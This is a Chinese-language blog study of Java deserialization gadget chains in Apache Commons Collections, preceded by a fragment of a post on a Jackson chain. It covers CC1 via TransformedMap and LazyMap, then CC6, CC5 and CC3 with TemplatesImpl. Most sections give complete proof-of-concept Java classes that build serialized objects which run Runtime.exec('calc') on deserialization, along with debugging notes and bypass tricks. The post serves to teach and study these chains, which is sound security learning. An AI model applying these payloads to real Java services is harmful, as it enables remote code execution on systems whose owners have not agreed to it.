参考：\nhttps://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload\nhttps://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DU2AAUx0IxY5D8WzmeD\n2023浙江大学生省赛初赛 secObj\n","permalink":"https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/","summary":"环境 jackson版本太老的话，POJONode中代码会不对 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-annotations\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.12.1.GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 0x01 writeValueAsString 这里我们jackson 原生链，利用点","title":"jackson原生链"},{"content":" 前言：主要是记录自己根据利用链，然后编写poc及遇到的问题和解决，然后组合一条链子（没啥意义当练手\n0x01 环境 \u0026lt;dependencies\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/junit/junit --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.11\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; Transformer 接口\npublic interface Transformer { Object transform(Object var1); } 然后下面三个实现类，CC链子利用核心，都实现了Transformer方法，然后这里先做个简单定义吧\nInvokerTransformer 不难看出是 通过反射调用obj方法，条件需要传入obj\n方法名字，对应方法参数类型，最后参数 都可以初始化的时候传入\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); }.... ConstantTransformer 返回初始化传入的obj\npublic ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } public Object transform(Object input) { return this.iConstant; } ChainedTransformer 像一个链子for调用transform，上一个this.iTransformers[i]调用结果作为下一个object参数\n这里着重看for的代码，执行一次后object值就被覆盖了，然后如果for没结束这里++i，这次transform中的object就是上次被覆盖的object值（这里起初没看懂，笨蛋）,for走完才会return\npublic ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } public Object transform(Object object) { for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } 对这几个有大概了解，我们这里可以写个demo\nInvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime()); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer}; Transformer keyTransformer = new ChainedTransformer(transformers); keyTransformer.transform(\u0026#34;calc\u0026#34;); 直接获取Runtime对象然后调用exec方法执行calc\n问题1 Runtime不能序列化 Exception in thread \u0026#34;main\u0026#34; java.io.NotSerializableException: java.lang.Runtime Runtime类是没有继承Serializable的，所以这里直接调用Runtime.getRuntime()肯定是不行的\n解决：\n可以用Runtime.class =\u0026gt; 属于java.lang.Class =\u0026gt; 继承java.io.Serializable\n那么就是构造问题了，下面是demo2\nMethod getRuntime = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime invoke = (Runtime) getRuntime.invoke(null); invoke.exec(\u0026#34;calc\u0026#34;); 疑问1 invoke(null) 这里为什么是invoke(null),一般不都是invoke(obj)么\n解答：\n结论：因为getRuntime是静态方法\n在 Java 中，**静态方法是属于类本身而不是类的实例（对象）的方法。**可以通过类名直接调用静态方法，而无需创建类的实例。\nRuntime.class.getMethod(\u0026quot;getRuntime\u0026quot;)获取的是Runtime类的getRuntime方法\ngetRuntime.invoke(null)实际上就是通过反射调用静态方法getRuntime，传入null表示没有特定的对象实例参与调用，\n因为该方法本来就不需要对象实例来调用。\n但是这里不能直接这样用看到**InvokerTransformer.transform**，这里传入的Runtime.class会变成Class\u0026lt;Class\u0026lt;Runtime\u0026gt;\u0026gt;相当于Class类他是没有getRuntime方法，所以我们还需要够着出这个结构Runtime.class.getMethod(\u0026quot;getRuntime\u0026quot;);但是getMethodClass类是有的所以构造这种形式getMethod.invoke(Runtime.class, \u0026quot;getRuntime\u0026quot;,null);\ndemo3\n因为每轮都要进行一次getClass()所以绕了这么大个圈子\n//getMethod(String name, Class\u0026lt;?\u0026gt;... parameterTypes) ---- String.class, Class[].class是为了下一次getMethod调用 Method getMethod = Runtime.class.getClass().getMethod(\u0026#34;getMethod\u0026#34;, String.class, Class[].class); Method getRuntime = (Method) getMethod.invoke(Runtime.class, \u0026#34;getRuntime\u0026#34;,null); Method myinvoke = getRuntime.getClass().getMethod(\u0026#34;invoke\u0026#34;, Object.class, Object[].class); Runtime runtime = (Runtime) myinvoke.invoke(getRuntime, null, null); Method exec = runtime.getClass().getMethod(\u0026#34;exec\u0026#34;, String.class); exec.invoke(runtime, \u0026#34;calc\u0026#34;); CC利用demo 最终利用demo，对于CC来说能调用到transform就能RCE\nInvokerTransformer invokerTransformer2 = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}); InvokerTransformer invokerTransformer1 = new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class, Object[].class}, new Object[]{null, null}); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;,null}); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,invokerTransformer1,invokerTransformer2}; Transformer keyTransformer = new ChainedTransformer(transformers); keyTransformer.transform(null); CommonsCollections1 TransformedMap利用链 8u71之前 利用链\nsun.reflect.annotation.AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() 达到任意代码执行的目的 Java 8u71 以后由于 Java 官⽅修改了 sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数：\n改动后，不再直接使⽤反序列化得到的 Map 对象，⽽是新建了⼀个 LinkedHashMap 对象，并将原来的键值添加进去。\n所以，后续对 Map 的操作都是基于这个新的 LinkedHashMap 对象，⽽原来我们精⼼构造的 Map 不再执⾏ set 或 put 操作，也就不会触发 RCE 了。\n改后的readObject（这里是8u74版本）,可以看到setValue方法也没有了\nprivate void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { ObjectInputStream.GetField var2 = var1.readFields(); Class var3 = (Class)var2.get(\u0026#34;type\u0026#34;, (Object)null); Map var4 = (Map)var2.get(\u0026#34;memberValues\u0026#34;, (Object)null); AnnotationType var5 = null; try { var5 = AnnotationType.getInstance(var3); } catch (IllegalArgumentException var13) { throw new InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map var6 = var5.memberTypes(); LinkedHashMap var7 = new LinkedHashMap(); String var10; Object var11; for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) { Map.Entry var9 = (Map.Entry)var8.next(); var10 = (String)var9.getKey(); var11 = null; Class var12 = (Class)var6.get(var10); if (var12 != null) { var11 = var9.getValue(); if (!var12.isInstance(var11) \u0026amp;\u0026amp; !(var11 instanceof ExceptionProxy)) { var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + \u0026#34;[\u0026#34; + var11 + \u0026#34;]\u0026#34;)).setMember((Method)var5.members().get(var10)); } } } AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3); AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7); } 简单分析1 var6.get 这里我起初觉得var6.get这里可以用\nvar6 =\u0026gt; var5的this.memberTypes =\u0026gt; var3 =\u0026gt;AnnotationInvocationHandler的type属性 但是这里\nvar5 = AnnotationType.getInstance(var3); var5的this.memberTypes我们是不可控的，所以这里利用不了 跟踪AnnotationType.getInstance\npublic static AnnotationType getInstance(Class\u0026lt;? extends Annotation\u0026gt; var0) { //1.这里要继承Annotation JavaLangAccess var1 = SharedSecrets.getJavaLangAccess(); AnnotationType var2 = var1.getAnnotationType(var0); //2.这里类似转换类型 if (var2 == null) { var2 = new AnnotationType(var0); //3.这里进行初始化，然后返回AnnotationType对象到return到上一层 if (!var1.casAnnotationType(var0, (AnnotationType)null, var2)) { var2 = var1.getAnnotationType(var0); assert var2 != null; } } return var2; } 查看AnnotationType初始化\nvar1是我们传入的class，我们主要看this.memberTypes.put属性，这里先是hashmap初始化大小，最后两行this.memberTypes.put()将var1的class的方法存入到memberTypes中。\n有人可能会问为什么不能反射呢，这里调试进来点是readobject，这里我们只能控制var1，而且memberTypes值属于Hashmap\n还是会调用到Hashmap.get的，这里常规使用就是取对应方法名字的Method，笔者积累的还多，不知道这个能利用不。\n回归正题，我们需要找8u71以下版本复现\n趣事1 jdk下载 不知道我的问题还是什么，反正就是我点击对应版本下载出来的版本和我不一样，比如这里我8u20啊，出来却是8u74！\n然后抓包看了下，我8u20的下载链接确实不对，上面是其他版本的。然后我又去找了下其他版本下载链接，然后发现大概是下面这个\n但是b02不是固定，每几个版本有不一样，最后爆破下这个b。\nhttps://download.oracle.com/otn/java/jdk/8u73-b02/jdk-8u73-windows-x64.exe /otn/java/jdk/7u21-b11/jdk-7u21-windows-x64.exe /otn/java/jdk/8u40-b26/jdk-8u40-windows-x64.exe /otn/java/jdk/8u20-b26/jdk-8u20-windows-x64.exe 如愿下到8u20嘿嘿\nhttps://download.oracle.com/otn/java/jdk/8u20-b26/jdk-8u20-windows-x64.exe 我们看到8u20的AnnotationInvocationHandler.readObject，调试发现有点问题\n问题2 断点 这里可以看到有些断点段不到，这是因为是class文件的原因，源码不完整，我们需要去下载源码\n解决：\n8u低版本获取方法\n对应8u20的源码=\u0026gt;点击左下zip即可下载\n再进入到相应JDK的文件夹中，里面本来就有个src.zip的压缩包，我们解压到当前文件夹下src，然后把之前源码包(jdk-f5d77a430a29.zip)中/src/share/classes下的sun文件夹拷贝到src文件夹中去。打开IDEA，选择文件 \u0026mdash;\u0026gt;项目结构 \u0026mdash;\u0026gt;SDK \u0026mdash;\u0026gt;源路径 \u0026mdash;\u0026gt;把src文件夹添加到源路径下，保存即可。\n再看时发现源码都变了\n正片开始 sun.reflect.annotation.AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() 达到任意代码执行的目的 这里先放poc，我是边调边改poc，感觉描述的话跟着poc好描述点\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Annotation; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.Collections; import java.util.HashMap; import java.util.Map; public class CC1_TransformedMap { public static void main(String[] args) throws Exception { InvokerTransformer invokerTransformer2 = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}); InvokerTransformer invokerTransformer1 = new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class, Object[].class}, new Object[]{null, null}); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;,null}); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,invokerTransformer1,invokerTransformer2}; Transformer keyTransformer = new ChainedTransformer(transformers); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); HashMap hashmap = new HashMap(); hashmap.put(\u0026#34;value\u0026#34;,1111); Map map = TransformedMap.decorate(hashmap,null,keyTransformer); Object obj = declaredConstructor.newInstance(Target.class, map); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(obj); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } AnnotationInvocationHandler.memberValues我们传入的是TransformedMap,其有个decorate方法可以调用自构方法，返回其对象，主要留意map和valueTransformer\n然后我们看AnnotationInvocationHandler.readObject的memberValues#entrySet方法\n这里会跳到AbstractInputCheckedMapDecorator#entrySet，TransformedMap没这个方法调用其父类的，但是这里isSetValueChecking是调用TransformedMap自己，判断valueTransformer是否有值，有值=\u0026gt;true，这里进入if\n这里主要是map#entrySet()，这里map得有值readObject才能进入for，这里map来自TransformedMap初始化调用super传入的\n会写到AbstractMapDecorator的this.map中，而AbstractInputCheckedMapDecorator继承AbstractMapDecorator且此类中没自定义map这个属性，所以这里调用的是AbstractMapDecorator.map及TransformedMap初始化第一个参数，我们不能让其size为0，所以poc中要给其put一个值\n疑问2 value 为什么put的key要是value\n解答：\n这里我们要进入if，memberType不能为null，memberTypes相当于map，而memberTypes的值我们可以发现是获取type中的方法(具体可以看下面type的分析)，这里我们选择的是Target.class其中方法只有一个value方法，memberTypes.key则是方法名字，name是获取我们设置hashmap中key，所以key必须是value\n@Documented @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.ANNOTATION_TYPE) public @interface Target { ElementType[] value(); } 往下到memberValue.setValue，memberValue的值为AbstractInputCheckedMapDecorator$MapEntry\nAbstractInputCheckedMapDecorator#setValue\n疑问3 parent 这里parent是在readobject里调用entrySet中的EntrySet写入的，这里this还是TransformedMap，然后EntrySet覆写parent\n最后到checkSetValue方法调用transform，成功利用！！\n存档1 type 我们要保证readObject中annotationType = AnnotationType.getInstance(type);不报错\n归根就是看我们传入的class是不是继承Annotation（其实就是判断是不是注解类型）\n但是Annotation不能直接继承\n关于java.lang.annotation.Annotation接口的性质\n是所有注解类型的通用接口： 这意味着所有自定义的注解类型在底层都与这个接口有一定的关联，但不是通过传统的继承方式建立这种关联。 它为注解类型提供了一些共同的行为规范，但本身并不直接定义一个具体的注解。 不能通过手动继承来定义注解类型： 如果一个普通的接口去继承这个Annotation接口，不能将其变为一个注解类型。注解类型必须通过特定的方式（使用@interface关键字）来定义，而不是通过继承这个接口。 annotationType = AnnotationType.getInstance(type); 会返回一个AnnotationType对象，而memberTypes则是存储我们传入class中的方法 所以这里我们利用的条件：\n是注解类型 含有方法 是jar中类 @Documented @Inherited @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.TYPE) public @interface IDProperty { public String value(); } 这里我又找了个IDProperty成功执行命令\nLazyMap azyMap 的漏洞触发点和 TransformedMap 唯一的差别是，TransformedMap 是在写入元素的时候执行 transform，而 LazyMap 是在其 get 方法中执行的 factory.transform 。\n利用链\nGadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() LazyMap 的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值：\n由于 AnnotationInvocationHandler 的 readObject 方法中并没有直接调用到 Map 的 get 方法。ysoserial 的解决方法是通过动态代理用 AnnotationInvocationHandler 生成 Proxy Map, 当 readObject 中调用这个 Map 的任意方法时, 触发代理类的 invoke 方法, 正好 AnnotationInvocationHandler invoke 中调用了 get 方法：\npoc构造 import com.sun.javafx.beans.IDProperty; import org.apache.commons.collections.Factory; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import javax.annotation.PreDestroy; import java.io.*; import java.lang.annotation.Annotation; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.util.Collections; import java.util.HashMap; import java.util.Map; public class CC1_LazyMap { public static void main(String[] args) throws Exception { InvokerTransformer invokerTransformer2 = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}); InvokerTransformer invokerTransformer1 = new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class, Object[].class}, new Object[]{null, null}); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;,null}); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,invokerTransformer1,invokerTransformer2}; Transformer keyTransformer = new ChainedTransformer(transformers); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); HashMap hashmap = new HashMap(); hashmap.put(\u0026#34;value\u0026#34;,1111); LazyMap lazymap = (LazyMap) LazyMap.decorate(hashmap, keyTransformer); InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(IDProperty.class, lazymap); Map map = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); Object obj = declaredConstructor.newInstance(IDProperty.class, map); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(obj); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } 过程也很简单，自己稍微跟下就好。唯有有个动态代理，可以搜下相关文章，这里就不展开了，然后过程中有个问题\n问题3 debug 这里我调试的时候，这里我点击堆栈中的AnnotationInvocationHandler类，会自动弹出几个计算器，后面map也会有entrySet这个key，进入不了这个if。然后AnnotationInvocationHandler中我不能打断点不然也会出现上面的情况。\n总的来说，就是不会按照你设想的走，这里我们关掉一个设置就好了\n解决：\n这里关闭启用集合类替代视图，这个我就没深究为什么了，有懂的大哥就补充下！\nCommonsCollections6 由于在 Java 8u71以后 sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑发生改变，导致CommonsCollections1 利用链无法使用，因为 sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数不再直接使⽤反序列化得到的 Map 对象，⽽是新建了⼀个 LinkedHashMap 对象，并将原来的键值添加进去。\n为解决Java⾼版本利⽤问题，实际上就是在找上下⽂中是否还有其他调⽤ LazyMap#get() 的地⽅。\n看到最后一行会覆盖我们的Lazymap为LinkedHashMap\nGadget chain: java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() ChainedTransformer.transform() import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; public class CC6 { public static void main(String[] args) throws Exception { InvokerTransformer invokerTransformer2 = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}); InvokerTransformer invokerTransformer1 = new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class, Object[].class}, new Object[]{null, null}); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;,null}); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,invokerTransformer1,invokerTransformer2}; Transformer keyTransformer = new ChainedTransformer(transformers); LazyMap fistrmap = (LazyMap) LazyMap.decorate(new HashMap(),keyTransformer); fistrmap.put(\u0026#34;fistrmap\u0026#34;,1111); TiedMapEntry tiedMapEntry = new TiedMapEntry(fistrmap,\u0026#34;fistrmap\u0026#34;); HashMap map = new HashMap(); map.put(tiedMapEntry, \u0026#34;B\u0026#34;); HashSet hashSet = new HashSet(); Field map1 = hashSet.getClass().getDeclaredField(\u0026#34;map\u0026#34;); map1.setAccessible(true); map1.set(hashSet,map); Field key = tiedMapEntry.getClass().getDeclaredField(\u0026#34;key\u0026#34;); key.setAccessible(true); key.set(tiedMapEntry,\u0026#34;kkkey\u0026#34;); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(hashSet); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } 链子整体很简单，自己看利用链构造poc就行。\n大概有两个地方要讲吧\nmap传参 map看似没法控制实则不然，看到上一行e的获取是反序列化获取的，我们去看writeObject\n上面e其实是map中的key序列化存储的，所以e我们是可控的，然后就有后面的链子调用了\n可以看到key是我们精心设置的值\n问题4 Lazymap.get 这里因为序列化的时候有HashMap#put这个操作会调用到最后利用点，但是这里还不能被调用，因为调用后序列化还没完成就会报错退出\n但是key一样的话的，反序列化这里就会为true就不会进入if\n解决：\n这里就是先让其key一样，然后HashMap#put后跳过if，然后我们在利用反射修改key\nCommonsCollections5 cc5 将 cc6 的入口点 HashMap 替换成了 BadAttributeValueExpException\nGadget chain: javax.management.BadAttributeValueExpException.readObject() TiedMapEntry.toString() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; public class CC5 { public static void main(String[] args) throws Exception { InvokerTransformer invokerTransformer2 = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}); InvokerTransformer invokerTransformer1 = new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class, Object[].class}, new Object[]{null, null}); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;,null}); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,invokerTransformer1,invokerTransformer2}; Transformer keyTransformer = new ChainedTransformer(transformers); LazyMap fistrmap = (LazyMap) LazyMap.decorate(new HashMap(),keyTransformer); fistrmap.put(\u0026#34;fistrmap\u0026#34;,1111); TiedMapEntry tiedMapEntry = new TiedMapEntry(fistrmap,\u0026#34;nono\u0026#34;); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); Constructor\u0026lt;?\u0026gt; o = aClass.getDeclaredConstructor(Object.class); o.setAccessible(true); Object o1 = o.newInstance(11); Field val = aClass.getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(o1, tiedMapEntry); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(o1); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } 没啥好说的，就一个点val用反射赋值\n问题5 val 这里直接构造函数初始化，会提前调用toString且val会被覆盖成一段String，和rome链子一样\n解决：\n反射赋值val即可\nCommonsCollections3 cc3需要添加javassist依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.12.1.GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; cc3 相比于前面的 cc 链有两个特性, 第一是它引入了 TemplatesImpl 来执行任意 java 字节码, 第二是它将 InvokerTransformer 换成了 InstantiateTransformer, 并通过 TrAXFilter 来引发 TemplatesImpl 链\n前面讲过 InstantiateTransformer 可以实例化某个类, 这里实例化的是 TrAXFilter\n它的构造方法会调用 templates.newTransformer(), 正好能与 TemplatesImpl 链串起来\n因为出现 SerialKiller 反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。\n所以 CommonsCollections3 是为了绕过⼀些规则对InvokerTransformer的限制。没有使用到 InvokerTransformer 来调用任意方法，而是用到了另⼀个类， com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter。\nSerialKiller绕过\n改编CC1的LazyMap链子，实例化TrAXFilter AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() 先看到TrAXFilter，我们可以得到其\n自构方法是public 没有继承Serializable 所以\n反射时可以省去setAccessible(true);这步操作\nConstantTransformer里要传入TrAXFilter.class\n然后我们看到InstantiateTransformer#transform，可以看到这里也正好符合我们传入TrAXFilter.class，然后实例化，且参数都可控\npublic Object transform(Object input) { try { if (input instanceof Class == false) { throw new FunctorException( \u0026#34;InstantiateTransformer: Input object was not an instanceof Class, it was a \u0026#34; + (input == null ? \u0026#34;null object\u0026#34; : input.getClass().getName())); } Constructor con = ((Class) input).getConstructor(iParamTypes); return con.newInstance(iArgs); 然后我们开始构造poc，改下CC1的链子开始调试，这里给_name赋值\n我们要_class[i] = loader.defineClass(_bytecodes[i]);加载字节码，给_bytecodes赋值字节码\n这里注意一下_bytecodes的类型是byte[][]，他的一维数组的值就是一个类的字节码，可以存储多个类的字节码\nprivate byte[][] _bytecodes = null; 问题6 NullPointerException 这里有个问题_auxClasses是null，这里直接put会报错，但是我们给_auxClasses赋值new Hashtable()也不行，因为com.sun.org.apache.xalan.internal.xsltc.runtime.Hashtable没有继承Serializable。\nprivate Hashtable _auxClasses = null; 解决：\n所以这里我们走另一条路，这里是获取加载后的_class[i]的父类名字和ABSTRACT_TRANSLET进行比较\nsuperClass.getName().equals(ABSTRACT_TRANSLET) private static String ABSTRACT_TRANSLET = \u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; 